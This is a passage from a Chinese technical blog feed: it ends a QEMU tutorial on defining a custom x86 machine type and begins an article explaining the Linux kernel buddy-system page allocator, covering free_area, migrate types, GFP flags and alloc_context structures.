class="hljs-number">0</span>,<br>                                sysbus_mmio_get_region(SYS_BUS_DEVICE(dev), <span class="hljs-number">0</span>));<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意新版本和老版本的 API 不同，在老版本中应当使用如下 API：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br><br>    DeviceState *dev = qdev_create(<span class="hljs-literal">NULL</span>, TYPE_A3_PC_PCIE_HOST);<br><br>    qdev_init_nofail(dev);<br>    ms-&gt;pci = PCI_HOST_BRIDGE(dev);<br><br>    memory_region_add_subregion(get_system_memory(), <span class="hljs-number">0</span>,<br>                                sysbus_mmio_get_region(SYS_BUS_DEVICE(dev), <span class="hljs-number">0</span>));<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br></code></pre></td></tr></table></figure><p>完成这些步骤之后我们的新机器就能随意插入各种 PCI 设备了；）</p><h3 id="II、添加新的-CPU-插槽🕊"><a href="#II、添加新的-CPU-插槽🕊" class="headerlink" title="II、添加新的 CPU 插槽🕊"></a>II、添加新的 CPU 插槽🕊</h3><p>当然，我们的机器还缺少了 CPU，没有 CPU 的机器自然是跑不起来的，因此这里我们还需要在我们的机器类型当中添加上相应的 CPU 插槽，由于 Qemu 内部的基础 x86 机器架构已经实现好了基础框架，所以我们直接改为继承自对应的 x86 基础机器类即可</p><blockquote><p>当然，如果是纯纯自定义的异架构，这里还是得自己手动写一套…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    X86MachineState parent;<br><br>    <span class="hljs-comment">/* &lt;public&gt; */</span><br><br>    <span class="hljs-comment">/* State for other subsystems/APIs: */</span><br>    Notifier machine_done;<br><br>    <span class="hljs-comment">/* Pointers to devices and objects: */</span><br>    PCIBus *bus;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * QEMU requires the entire PCI(e) hierarchy be attached to</span><br><span class="hljs-comment">     * a PCI(e) bus, so BES-VNC machine has to implement one.</span><br><span class="hljs-comment">     */</span><br>    PCIHostState *pci;<br>&#125; A3PCMachineState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    X86MachineClass parent;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br><br>    <span class="hljs-comment">/* Default CPU model version.  See x86_cpu_set_default_version(). */</span><br>    <span class="hljs-type">int</span> default_cpu_version;<br>&#125; A3PCMachineClass;<br></code></pre></td></tr></table></figure><p>不过机器定义的文件当中需要改动的部分会比预想的要多，<del>所以这里就先🕊🕊🕊了</del></p><h3 id="Extra-自定义-CPU-🕊"><a href="#Extra-自定义-CPU-🕊" class="headerlink" title="Extra.自定义 CPU 🕊"></a>Extra.自定义 CPU 🕊</h3><blockquote><p>🕊🕊🕊</p></blockquote><h2 id="四、编译运行🕊"><a href="#四、编译运行🕊" class="headerlink" title="四、编译运行🕊"></a>四、编译运行🕊</h2><p>由于我们新建立的机器类型为 <code>x86</code> 架构的机器，因此我们需要在执行 configure 脚本时指定 <code>--target-list=x86_64-softmmu</code> </p><p>这里需要注意的是前前面笔者提供了两种设置 <code>CONFIG_A3_PC</code> 的选项：如果我们是直接通过修改 <code>default.mak</code> 使得 <code>CONFIG_A3_PC=y</code>，则直接编译即可；若我们是通过修改了 <code>configure</code> 来指定 <code>CONFIG_A3_PC</code> 的值，则创建编译脚本的时候我们需要手动指定 <code>--enable-a3-pc</code> 来编译上我们新增的机器类型</p><p>编译完成后我们便能够看到我们新添加的机器类型 <code>a3-pc</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">./qemu-system-x86_64 -machine ?</span><br>Supported machines are:<br>microvm              microvm (i386)<br>pc                   Standard PC (i440FX + PIIX, 1996) (alias of pc-i440fx-7.0)<br>pc-i440fx-7.0        Standard PC (i440FX + PIIX, 1996) (default)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">...</span><br>a3-pc                (null)<br></code></pre></td></tr></table></figure><blockquote><p>🕊🕊🕊</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;不如 VMWare👋&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="PCI" scheme="http://blog.arttnba3.cn/tags/PCI/"/>
    
    <category term="Qemu" scheme="http://blog.arttnba3.cn/tags/Qemu/"/>
    
    <category term="虚拟化" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>【OS.0x03】Linux内核内存管理II - Buddy System</title>
    <link href="http://blog.arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/"/>
    <id>http://blog.arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/</id>
    <published>2022-06-30T15:44:49.000Z</published>
    <updated>2023-05-08T17:54:32.482Z</updated>
    
    <content type="html"><![CDATA[<p>HEY DUDE!</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>在<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/">上一篇文章</a>中笔者简要阐述了 Linux 内核当中内存的基本组织架构：页、区、节点，在本篇文章当中笔者将阐述内核中最<strong>基础</strong>的内存分配器——<strong>Buddy Systen</strong>（伙伴系统）</p><blockquote><p>通过读取 <code>/proc/buddyinfo</code> 可以获取当前系统中 buddy system 的详细信息</p><p><img src="https://i.loli.net/2021/11/30/eRiVXpyUkncYZus.png" alt="image.png"></p><blockquote><p>笔者的💻配置比较🚮，所以只有一个 node，非常抱歉…</p></blockquote></blockquote><blockquote><p>这篇文章其实很早就写了个框架了，但是后面一直没有来得及进行补完…（其实就是懒而已吧（恼））</p><p><img src="https://s2.loli.net/2022/06/08/7VaQ6riZOcmDuEg.png" alt="image.png"></p></blockquote><h1 id="0x01-buddy-system-中的内存组织形式"><a href="#0x01-buddy-system-中的内存组织形式" class="headerlink" title="0x01.buddy system 中的内存组织形式"></a>0x01.buddy system 中的内存组织形式</h1><h2 id="zone-中的-free-area-结构体数组"><a href="#zone-中的-free-area-结构体数组" class="headerlink" title="zone 中的 free_area 结构体数组"></a>zone 中的 free_area 结构体数组</h2><p>前文中我们讲到，每个 zone 结构体中都有一个 free_area 结构体数组，用以存储 buddy system <strong>按照 order 管理的页面</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> &#123;</span><br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span><span class="hljs-title">free_area</span>[<span class="hljs-title">MAX_ORDER</span>];</span><br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>其中的 <code>MAX_ORDER</code> 为一个常量，值为 11</p><p>在 buddy system 中按照空闲页面的连续大小进行分阶管理，这里的 order 的实际含义为<strong>连续的空闲页面的大小</strong>，不过单位不是页面数，而是<code>阶</code>，即对于每个下标而言，其中所存储的页面大小为：<br>$$<br>2^{order}<br>$$<br>在 free_area 中存放的页面通过自身的相应字段连接成双向链表结构，由此我们得到这样一张_Overview_：</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="自己画的图.png"></p><p>下面我们来解析 <code>free_area</code> 的具体结构，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">free_list</span>[<span class="hljs-title">MIGRATE_TYPES</span>];</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>nr_free;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="free-list：空闲页面双向链表"><a href="#free-list：空闲页面双向链表" class="headerlink" title="free_list：空闲页面双向链表"></a>free_list：空闲页面双向链表</h3><p>我们不难看出：free_area 的 free_list 字段便是用以存放指向空闲页面的指针，其通过 page 结构体的 <code>lru</code> 字段将 page 结构体连接成双向链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> &#123;</span><br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><span class="hljs-comment">/* 页缓存与匿名页 */</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @lru: Pageout 链表, 例如 active_list 便由</span><br><span class="hljs-comment"> * lruvec-&gt;lru_lock 保护。  </span><br><span class="hljs-comment"> * 有时会被页所有者作为常规链表使用。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">lru</span>;</span><br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>page 结构体中的 <code>lru</code> 这一字段的类型为 <code>struct list_head</code>，这是内核编程中通用的双向链表结构，<strong>free_list 与 lru 链表都使用该字段</strong> 将页结构体组织为_双向链表_，即_一个页是不可能同时出现在 lru 链表与 buddy system 中的_</p><h4 id="迁移类型分链表"><a href="#迁移类型分链表" class="headerlink" title="迁移类型分链表"></a><em>迁移类型分链表</em></h4><p>在这里我们注意到free_area 中<strong>并非只有一个双向链表</strong>，而是按照不同的“迁移类型”（migrate type）进行分开存放，这是由于_页面迁移_机制的存在</p><p>页面迁移主要用以解决内核空间中的<strong>碎片问题</strong>，在长期的运行之后内存当中空闲页面的分布可能是零散的，这便导致了内核<strong>有可能无法映射到足够大的连续内存</strong>，因此需要进行_页面迁移_——将旧的页面迁移到新的位置</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="从知乎偷的图.png"></p><p>但<strong>并非所有的页面都是能够随意迁移的</strong>，因此我们在 buddy system 当中还需要将页面按照迁移类型进行分类</p><p>迁移类型由一个枚举类型定义，定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">migratetype</span> &#123;</span><br>MIGRATE_UNMOVABLE,<br>MIGRATE_MOVABLE,<br>MIGRATE_RECLAIMABLE,<br>MIGRATE_PCPTYPES,<span class="hljs-comment">/* the number of types on the pcp lists */</span><br>MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CMA</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * MIGRATE_CMA migration type is designed to mimic the way</span><br><span class="hljs-comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span><br><span class="hljs-comment"> * from MIGRATE_CMA pageblocks and page allocator never</span><br><span class="hljs-comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The way to use it is to change migratetype of a range of</span><br><span class="hljs-comment"> * pageblocks to MIGRATE_CMA which can be done by</span><br><span class="hljs-comment"> * __free_pageblock_cma() function.  What is important though</span><br><span class="hljs-comment"> * is that a range of pageblocks must be aligned to</span><br><span class="hljs-comment"> * MAX_ORDER_NR_PAGES should biggest page be bigger then</span><br><span class="hljs-comment"> * a single pageblock.</span><br><span class="hljs-comment"> */</span><br>MIGRATE_CMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span><br>MIGRATE_ISOLATE,<span class="hljs-comment">/* can&#x27;t allocate from here */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>MIGRATE_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>MIGRATE_UNMOVABLE</strong>：这类型页面在内存当中有着固定的位置，<strong>不能移动</strong></li><li><strong>MIGRATE_MOVABLE</strong>：这类页面<strong>可以随意移动</strong>，例如用户空间的页面，我们只需要复制数据后改变页表映射即可</li><li><strong>MIGRATE_RECLAIMABLE</strong>：这类页面<strong>不能直接移动，但是可以删除</strong>，例如映射自文件的页</li><li><strong>MIGRATE_PCPTYPES</strong>：<code>per_cpu_pageset</code>，即每 CPU 页帧缓存，其迁移<strong>仅限于同一节点内</strong></li><li><strong>MIGRATE_CMA</strong>：<code>Contiguous Memory Allocator</code>，即<strong>连续的物理内存</strong></li><li><strong>MIGRATE_ISOLATE</strong>：<strong>不能从该链表分配页面</strong>，该链表用于跨 NUMA 节点进行页面移动，将页面移动到使用该页面最为频繁的 CPU 所处节点</li><li><em>MIGRATE_TYPES_：表示迁移类型的数目，_并不存在这一链表</em></li></ul><p>以 <em>free_list[0]</em> 作为例子，我们可以得到如下 overview：</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="自己画的图.png"></p><h3 id="nr-free：空闲页面（块）计数"><a href="#nr-free：空闲页面（块）计数" class="headerlink" title="nr_free：空闲页面（块）计数"></a>nr_free：空闲页面（块）计数</h3><p>该字段记录了在当前 free_area 中的空闲页面块的数量，对于 free_area[0] 以外的 free_area 而言其单位并非是单个页框，而是以_内存块_为单位</p><h1 id="0x02-页的分配"><a href="#0x02-页的分配" class="headerlink" title="0x02.页的分配"></a>0x02.页的分配</h1><p>buddy system 提供了一组用以进行页面分配的接口，接下来笔者将以自底向上的方式进行源码分析</p><h2 id="一、GFP（get-free-page）标志位"><a href="#一、GFP（get-free-page）标志位" class="headerlink" title="一、GFP（get free page）标志位"></a>一、GFP（get free page）标志位</h2><blockquote><p>GFP标志位这一节基本上搬运自<a href="https://blog.csdn.net/yhb1047818384/article/details/112298996">这篇文章</a></p></blockquote><p>在 kernel memory allocation 中我们经常能见到 <code>gfp_t</code> 类型，其表示分配时的标志位，定义在 <code>include/linux/gfp.h</code> 中，大概有如下这些可用标志位：</p><ul><li><strong>内存管理区修饰符 (zone modifiers)</strong></li></ul><p>内存管理区修饰符主要描述从哪些内存管理区来分配内存</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_DMA</td><td align="left">从ZONE_DMA区中分配内存</td></tr><tr><td align="left">__GFP_HIGNMEM</td><td align="left">从ZONE_HIGHMEM区中分配内存</td></tr><tr><td align="left">__GFP_DMA32</td><td align="left">从ZONE_DMA32区中分配内存</td></tr><tr><td align="left">__GFP_MOVABLE</td><td align="left">内存规整时可以迁移或回收页面</td></tr></tbody></table><ul><li><strong>移动和替换修饰符(mobility and placement modifiers)</strong></li></ul><p>移动和替换修饰符主要表示分配出来的页面具有的迁移属性</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_RECLAIMABLE</td><td align="left">分配的内存页面可以回收</td></tr><tr><td align="left">__GFP_WRITE</td><td align="left">申请的页面会被弄成脏页</td></tr><tr><td align="left">__GFP_HARDWALL</td><td align="left">强制使用cpuset内存分配策略</td></tr><tr><td align="left">__GFP_THISNODE</td><td align="left">在指定的节点上分配内存</td></tr><tr><td align="left">__GFP_ACCOUNT</td><td align="left">kmemcg会记录分配过程</td></tr></tbody></table><ul><li><strong>水位修饰符 （watermark modifiers）</strong></li></ul><p>与水位线相关的标志位</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_ATOMIC</td><td align="left">高优先级分配内存，分配器可以分配最低警戒水位线下的预留内存</td></tr><tr><td align="left">__GFP_HIGH</td><td align="left">分配内存的过程中不可以睡眠或执行页面回收动作</td></tr><tr><td align="left">__GFP_MEMALLOC</td><td align="left">允许访问所有的内存</td></tr><tr><td align="left">__GFP_NOMEMALLOC</td><td align="left">不允许访问最低警戒水位线下的系统预留内存</td></tr></tbody></table><ul><li><strong>页面回收修饰符（reclaim modifiers)</strong></li></ul><p>与页面回收相关的标志位</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_IO</td><td align="left">启动物理I&#x2F;O传输</td></tr><tr><td align="left">__GFP_FS</td><td align="left">允许调用底层FS文件系统。可避免分配器递归到可能已经持有锁的文件系统中， 避免死锁</td></tr><tr><td align="left">__GFP_DIRECT_RECLAIM</td><td align="left">分配内存过程中可以使用直接内存回收</td></tr><tr><td align="left">__GFP_KSWAPD_RECLAIM</td><td align="left">内存到达低水位时唤醒kswapd线程异步回收内存</td></tr><tr><td align="left">__GFP_RECLAIM</td><td align="left">表示是否可以直接内存回收或者使用kswapd线程进行回收</td></tr><tr><td align="left">__GFP_RETRY_MAYFAIL</td><td align="left">分配内存可以可能会失败，但是在申请过程中会回收一些不必要的内存，是整个系统受益</td></tr><tr><td align="left">__GFP_NOFAIL</td><td align="left">内存分配失败后无限制的重复尝试，知道分配成功</td></tr><tr><td align="left">__GFP_NORETRY</td><td align="left">直接页面回收或者内存规整后还是无法分配内存时，不启用retry反复尝试分配内存，直接返回NULL</td></tr></tbody></table><ul><li><strong>行为修饰符 (action modifiers)</strong></li></ul><p>与分配时的行为相关的标志位</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_NOWARN</td><td align="left">关闭内存分配过程中的WARNING</td></tr><tr><td align="left">__GFP_COMP</td><td align="left">分配的内存页面将被组合成复合页compound page</td></tr><tr><td align="left">__GFP_ZERO</td><td align="left">返回一个全部填充为0的页面</td></tr></tbody></table><ul><li><strong>组合类型标志(Useful GFP flag combinations)</strong></li></ul><p>前面描述的修饰符种过于繁多，因此linux定义了一些组合的类型标志，供开发者使用。</p><table><thead><tr><th align="left">flag</th><th align="left">element</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">GFP_ATOMIC</td><td align="left">__GFP_HIGH |__GFP_ATOMIC |__GFP_KSWAPD_RECLAIM</td><td align="left">分配过程不能休眠，分配具有高优先级，可以访问系统预留内存</td></tr><tr><td align="left">GFP_KERNEL</td><td align="left">__GFP_RECLAIM |__GFP_IO |__GFP_FS</td><td align="left">分配内存时可以被阻塞(即休眠)</td></tr><tr><td align="left">GFP_KERNEL_ACCOUNT</td><td align="left">GFP_KERNEL |__GFP_ACCOUNT</td><td align="left">和GFP_KERNEL作用一样，但是分配的过程会被kmemcg记录</td></tr><tr><td align="left">GFP_NOWAIT</td><td align="left">__GFP_KSWAPD_RECLAIM</td><td align="left">分配过程中不允许因直接内存回收而导致停顿</td></tr><tr><td align="left">GFP_NOIO</td><td align="left">__GFP_RECLAIM</td><td align="left">不需要启动任何的I&#x2F;O操作</td></tr><tr><td align="left">GFP_NOFS</td><td align="left">__GFP_RECLAIM |__GFP_IO</td><td align="left">不会有访问任何文件系统的操作</td></tr><tr><td align="left">GFP_USER</td><td align="left">__GFP_RECLAIM |__GFP_IO |__GFP_FS |__GFP_HARDWALL</td><td align="left">用户空间的进程分配内存</td></tr><tr><td align="left">GFP_DMA</td><td align="left">__GFP_DMA</td><td align="left">从ZONE_DMA区分配内存</td></tr><tr><td align="left">GFP_DMA32</td><td align="left">__GFP_DMA32</td><td align="left">从ZONE_DMA32区分配内存</td></tr><tr><td align="left">GFP_HIGHUSER</td><td align="left">GFP_USER | __GFP_HIGHMEM</td><td align="left">用户进程分配内存，优先使用ZONE_HIGHMEM， 且这些页面不允许迁移</td></tr><tr><td align="left">GFP_HIGHUSER_MOVABLE</td><td align="left">GFP_HIGHUSER | __GFP_MOVABLE</td><td align="left">和GFP_HIGHUSER类似，但是页面可以迁移</td></tr><tr><td align="left">GFP_TRANSHUGE_LIGHT</td><td align="left">GFP_HIGHUSER_MOVABLE | __GFP_COMP | __GFP_NOMEMALLOC | __GFP_NOWARN) &amp; ~__GFP_RECLAIM</td><td align="left">透明大页的内存分配， light表示不进行内存压缩和回收</td></tr><tr><td align="left">GFP_TRANSHUGE</td><td align="left">GFP_TRANSHUGE_LIGHT | __GFP_DIRECT_RECLAIM</td><td align="left">和GFP_TRANSHUGE_LIGHT类似，通常khugepaged使用该标志</td></tr></tbody></table><h2 id="二、alloc-context-结构体：分配的上下文"><a href="#二、alloc-context-结构体：分配的上下文" class="headerlink" title="二、alloc_context 结构体：分配的上下文"></a>二、alloc_context 结构体：分配的上下文</h2><p>这是一个分配过程中非常重要的结构体，用来表示我们单次内存分配的上下文信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 用以保存在分配时涉及到的函数间传递的</span><br><span class="hljs-comment"> * 绝大部分的不可变的分配参数的结构体，</span><br><span class="hljs-comment"> * 包括 alloc_pages 函数族</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * nodemask, migratetype 与 highest_zoneidx 仅在</span><br><span class="hljs-comment"> * __alloc_pages_nodemask() 中被初始化一次，之后不再改变.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * zonelist, preferred_zone 与 highest_zoneidx 最初在</span><br><span class="hljs-comment"> * __alloc_pages_nodemask() 中为快速路径设置, 之后可能会在</span><br><span class="hljs-comment"> * __alloc_pages_slowpath() 中被改变. 其他所有的函数通过</span><br><span class="hljs-comment"> * 常量指针传递该结构体。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> *<span class="hljs-title">zonelist</span>;</span><br><span class="hljs-type">nodemask_t</span> *nodemask;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> *<span class="hljs-title">preferred_zoneref</span>;</span><br><span class="hljs-type">int</span> migratetype;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * highest_zoneidx 表示分配请求中最高的可用 zone 的下标。</span><br><span class="hljs-comment"> * 由于 zone 的性质, 相较于 highest_zoneidx，</span><br><span class="hljs-comment"> * 在更低的 zone 上的内存会由 lowmem_reserve[highest_zoneidx] 保护。</span><br><span class="hljs-comment"> * 译注：就是水位线机制，不记得的回去看上一篇文章</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * highest_zoneidx 同样被回收/压缩使用以限制目标 zone，</span><br><span class="hljs-comment"> * 因为高于该下标的 zone 无法用于此分配请求</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> <span class="hljs-title">highest_zoneidx</span>;</span><br><span class="hljs-type">bool</span> spread_dirty_pages;<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们主要关注如下成员：</p><ul><li>zonelist</li></ul><p>该成员表示在<strong>这一次的分配上下文</strong>中，我们将要操作的 zone 的<strong>列表</strong>，其为一个 <code>zonelist</code> 类型的<strong>结构体数组</strong>，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 单次分配请求在一个 zonelist 上操作. 一个 zonelist 便是一组 zone 的列表，</span><br><span class="hljs-comment"> * 其中第一个 zone 为分配的“目标”，而其他的 zone 为后备的zone，优先级降低。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 为了提高 zonelist 的读取速度, 在 zonerefs 中包含正在被读取的 entry 的 zone index。</span><br><span class="hljs-comment"> * 用来访问所给的 zoneref 结构体信息的帮助函数有：</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * zonelist_zone()- 返回一个 struct zone 的指针作为 _zonerefs 中的一个 entry</span><br><span class="hljs-comment"> * zonelist_zone_idx()- 返回作为 entry 的 zone 的 index</span><br><span class="hljs-comment"> * zonelist_node_idx()- 返回作为 entry 的 node 的 index</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> _<span class="hljs-title">zonerefs</span>[<span class="hljs-title">MAX_ZONES_PER_ZONELIST</span> + 1];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看到的是其为一个  <code>zoneref</code> 类型的结构体数组，该结构体定义如下，包含了一个 zone 的指针以及一个 index：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 该结构包含了 zonelist 中一个 zone 的信息。 </span><br><span class="hljs-comment"> * 其被储存在这里以预防对大结构体的解引用与对表的查询。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>;</span><span class="hljs-comment">/* 指向实际上的 zone 的指针 */</span><br><span class="hljs-type">int</span> zone_idx;<span class="hljs-comment">/* 